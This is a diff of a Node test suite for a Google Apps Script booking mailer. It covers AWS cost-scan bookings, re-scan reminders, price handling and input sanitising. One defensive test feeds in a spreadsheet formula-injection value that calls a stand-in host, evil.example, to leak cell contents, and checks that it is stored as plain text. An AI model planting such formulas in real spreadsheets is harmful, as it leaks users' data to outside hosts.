@@ -1,6 +1,6 @@
 // Runs case-study-mailer.gs in Node with fake Google services (Sheets, Mail,
-// Cache), so the Apps Script logic can be tested without deploying it.
-//   node --test tests/
+// Cache, triggers), so the Apps Script logic can be tested without deploying it.
+//   node --test tests/case-study-mailer.test.mjs
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
@@ -13,12 +13,15 @@ function load({ quota = 100, failMailTo = null } = {}) {
   const sent = [];
   const cache = new Map();
   const logs = [];
+  const triggers = [];
   const sheet = name => {
     const rows = (sheets[name] ||= []);
     return {
       getLastRow: () => rows.length,
       appendRow: r => rows.push(r),
       setFrozenRows: () => {},
+      getDataRange: () => ({ getValues: () => rows.map(r => r.slice()) }),
+      getRange: (r, c) => ({ setValue: v => { rows[r - 1][c - 1] = v; } }),
     };
   };
   const ctx = {
@@ -43,10 +46,16 @@ function load({ quota = 100, failMailTo = null } = {}) {
       createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }),
     },
     Utilities: {
-      formatDate: () => '260930',
+      formatDate: (d, _tz, fmt) => (fmt === 'yyMMdd' ? '260930' : new Date(d).toISOString().slice(0, 10)),
       base64Encode: b => Buffer.from(b).toString('base64'),
       computeDigest: (_a, s) => [...Buffer.from(String(s))],
       DigestAlgorithm: { MD5: 'md5' },
+    },
+    Session: { getScriptTimeZone: () => 'Asia/Kolkata' },
+    ScriptApp: {
+      getProjectTriggers: () => triggers,
+      newTrigger: fn => ({ timeBased: () => ({ everyDays: () => ({ atHour: () => ({
+        create: () => triggers.push({ getHandlerFunction: () => fn }) }) }) }) }),
     },
     UrlFetchApp: { fetch: () => ({ getBlob: () => ({ setName() { return this; } }) }) },
     Logger: { log: m => logs.push(m) },
@@ -54,7 +63,12 @@ function load({ quota = 100, failMailTo = null } = {}) {
   vm.createContext(ctx);
   vm.runInContext(SOURCE, ctx);
   const post = parameter => JSON.parse(ctx.doPost({ parameter }).getContent());
-  return { post, sheets, sent, logs };
+  // Read a booking row by column name, so tests don't depend on column order.
+  const cell = (rowIndex, header) => {
+    const rows = sheets['Audit bookings'];
+    return rows[rowIndex][rows[0].indexOf(header)];
+  };
+  return { post, sheets, sent, logs, ctx, cell, triggers };
 }
 
 const booking = (over = {}) => ({
@@ -62,39 +76,102 @@ const booking = (over = {}) => ({
   spend: '$10k–$50k', phone: '+91 98765 43210', currency: 'INR', notes: 'Mostly EC2', page: 'test',
   ...over,
 });
+const isDate = v => Object.prototype.toString.call(v) === '[object Date]';   // dates come from the sandbox realm
 
 test('valid booking: logged, hello@ notified, customer confirmed, reference returned', () => {
-  const { post, sheets, sent } = load();
+  const { post, sheets, sent, cell } = load();
   const res = post(booking());
   assert.equal(res.ok, true);
   assert.match(res.reference, /^AUD-260930-[A-HJ-NP-Z2-9]{4}$/);
 
-  const rows = sheets['Audit bookings'];
-  assert.equal(rows.length, 2, 'header + one booking');
-  assert.equal(rows[0][1], 'Reference');
-  const row = rows[1];
-  assert.equal(row[1], res.reference);
-  assert.equal(row[3], 'asha@example.com', 'email is lower-cased');
-  assert.equal(row[8], '₹19,999');
-  assert.equal(row.at(-1), 'new');
+  assert.equal(sheets['Audit bookings'].length, 2, 'header + one booking');
+  assert.equal(cell(1, 'Reference'), res.reference);
+  assert.equal(cell(1, 'Email'), 'asha@example.com', 'email is lower-cased');
+  assert.equal(cell(1, 'Full report price'), '₹19,999');
+  assert.equal(cell(1, 'Re-scan'), 'Just once');
+  assert.equal(cell(1, 'Next scan'), '');
+  assert.equal(cell(1, 'Status'), 'new');
 
   assert.equal(sent.length, 2);
   assert.equal(sent[0].to, 'hello@exommerce.online');
   assert.equal(sent[0].replyTo, 'asha@example.com');
-  assert.ok(sent[0].subject.includes(res.reference));
+  assert.ok(sent[0].subject.startsWith('Free scan booking ' + res.reference));
+  assert.ok(sent[0].body.includes(`python -m exaudit setup --reference ${res.reference} --customer "Acme Cloud"`));
   assert.equal(sent[1].to, 'asha@example.com');
   assert.equal(sent[1].replyTo, 'hello@exommerce.online');
+  assert.equal(sent[1].subject, `Your free AWS cost scan (${res.reference})`);
   assert.ok(sent[1].htmlBody.includes(res.reference));
   assert.ok(sent[1].body.startsWith('Hi Asha,'));
+  for (const text of [sent[1].body, sent[1].htmlBody]) {
+    assert.ok(text.includes('free summary'), 'sets expectations: the summary is free');
+    assert.ok(!/refund|guarantee/i.test(text), 'no refund promise any more');
+  }
+});
+
+test('a quarterly or yearly re-scan is scheduled at booking', () => {
+  const { post, cell, sent } = load();
+  post(booking({ cadence: 'quarterly' }));
+  assert.equal(cell(1, 'Re-scan'), 'Every quarter');
+  const next = cell(1, 'Next scan');
+  assert.ok(isDate(next));
+  const months = (next.getFullYear() - new Date().getFullYear()) * 12 + next.getMonth() - new Date().getMonth();
+  assert.equal(months, 3);
+  assert.match(sent[1].body, /check again every quarter/);
+
+  const yearly = load();
+  yearly.post(booking({ cadence: 'yearly' }));
+  assert.equal(yearly.cell(1, 'Re-scan'), 'Every year');
+
+  const odd = load();
+  odd.post(booking({ cadence: 'hourly' }));
+  assert.equal(odd.cell(1, 'Re-scan'), 'Just once', 'unknown schedules fall back to once');
+});
+
+test('due re-scans are sent to hello@ once, then roll forward', () => {
+  const { post, sheets, sent, ctx, cell } = load();
+  post(booking({ cadence: 'quarterly', email: 'due@example.com' }));
+  post(booking({ cadence: 'yearly', email: 'later@example.com', company: 'Later Co' }));
+  post(booking({ cadence: 'once', email: 'once@example.com', company: 'Once Co' }));
+  const rows = sheets['Audit bookings'];
+  const nextCol = rows[0].indexOf('Next scan');
+  rows[1][nextCol] = new Date(Date.now() - 86400000);          // due yesterday
+  sent.length = 0;
+
+  assert.equal(ctx.remindDueScans(), 1);
+  assert.equal(sent.length, 1);
+  assert.equal(sent[0].to, 'hello@exommerce.online');
+  assert.equal(sent[0].subject, '1 re-scan due');
+  assert.ok(sent[0].body.includes('due@example.com') && sent[0].body.includes('Every quarter'));
+  assert.ok(!sent[0].body.includes('later@example.com'), 'not due yet');
+  const rolled = cell(1, 'Next scan');
+  assert.ok(isDate(rolled) && rolled > new Date(), 'moved on by a quarter');
+  assert.ok(isDate(cell(1, 'Last reminder')));
+
+  sent.length = 0;
+  assert.equal(ctx.remindDueScans(), 0, 'nothing twice');
+  assert.equal(sent.length, 0);
+});
+
+test('reminders are installed once', () => {
+  const { ctx, triggers } = load();
+  assert.equal(ctx.installReminders(), true);
+  assert.equal(ctx.installReminders(), false);
+  assert.equal(triggers.length, 1);
+});
+
+test('no bookings sheet yet: reminders do nothing', () => {
+  const { ctx, sent } = load();
+  assert.equal(ctx.remindDueScans(), 0);
+  assert.equal(sent.length, 0);
 });
 
 test('price comes from the server, not the browser', () => {
-  const { post, sheets } = load();
+  const { post, cell } = load();
   post(booking({ currency: 'USD', price: '$1' }));
-  assert.equal(sheets['Audit bookings'][1][8], '$299');
+  assert.equal(cell(1, 'Full report price'), '$299');
   const other = load();
   other.post(booking({ currency: 'GBP' }));
-  assert.equal(other.sheets['Audit bookings'][1][7], 'USD', 'unknown currency falls back to USD');
+  assert.equal(other.cell(1, 'Currency'), 'USD', 'unknown currency falls back to USD');
 });
 
 test('validation rejects bad input and sends nothing', () => {
@@ -155,10 +232,10 @@ test('notification failure: logged as failed and reported, so the page falls bac
 });
 
 test('confirmation failure does not fail a booking hello@ already has', () => {
-  const { post, sheets, logs } = load({ failMailTo: 'asha@example.com' });
+  const { post, logs, cell } = load({ failMailTo: 'asha@example.com' });
   const res = post(booking());
   assert.equal(res.ok, true);
-  assert.equal(sheets['Audit bookings'][1].at(-1), 'new');
+  assert.equal(cell(1, 'Status'), 'new');
   assert.match(logs[0], /confirmation failed/);
 });
 
@@ -170,40 +247,36 @@ test('HTML in names is escaped in the confirmation email', () => {
 });
 
 test('spreadsheet formulas from visitors are stored as plain text', () => {
-  const { post, sheets } = load();
+  const { post, sheets, cell } = load();
   post(booking({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)', notes: '-2+3' }));
-  const row = sheets['Audit bookings'][1];
-  assert.equal(row[2], `'=IMAGE("https://evil.example/?"&A1)`);
-  assert.equal(row[4], "'@SUM(1)");
-  assert.equal(row[6], "'+91 98765 43210", 'phone numbers stay text, not a formula');
-  assert.equal(row[9], "'-2+3");
-  // (the Date comes from the sandbox's realm, so check its tag, not instanceof)
-  assert.equal(Object.prototype.toString.call(row[0]), '[object Date]', 'non-strings are untouched');
+  assert.equal(cell(1, 'Name'), `'=IMAGE("https://evil.example/?"&A1)`);
+  assert.equal(cell(1, 'Company'), "'@SUM(1)");
+  assert.equal(cell(1, 'Phone / WhatsApp'), "'+91 98765 43210", 'phone numbers stay text, not a formula');
+  assert.equal(cell(1, 'Notes'), "'-2+3");
+  assert.ok(isDate(sheets['Audit bookings'][1][0]), 'non-strings are untouched');
 
   const other = load();
   other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
   assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
 });
 
-test('under-$3k bookings are flagged for hello@', () => {
+test('small accounts are flagged for hello@', () => {
   const { post, sent } = load();
   post(booking({ spend: 'Under $3k' }));
-  assert.match(sent[0].body, /under the \$3k\/month minimum/);
+  assert.match(sent[0].body, /Small account \(under \$3k\/month\)/);
 });
 
 test('long fields are trimmed to their limits', () => {
-  const { post, sheets } = load();
+  const { post, cell } = load();
   post(booking({ notes: 'x'.repeat(5000), name: 'N'.repeat(300) }));
-  const row = sheets['Audit bookings'][1];
-  assert.equal(row[2].length, 100);
-  assert.equal(row[9].length, 2000);
+  assert.equal(cell(1, 'Name').length, 100);
+  assert.equal(cell(1, 'Notes').length, 2000);
 });
 
 test('GET reports which forms this deployment handles', () => {
-  const src = SOURCE;
   const ctx = { ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }) } };
   vm.createContext(ctx);
-  vm.runInContext(src, ctx);
+  vm.runInContext(SOURCE, ctx);
   const res = JSON.parse(ctx.doGet().getContent());
   assert.equal(res.ok, true);
   assert.ok(res.forms.includes('audit_booking'));
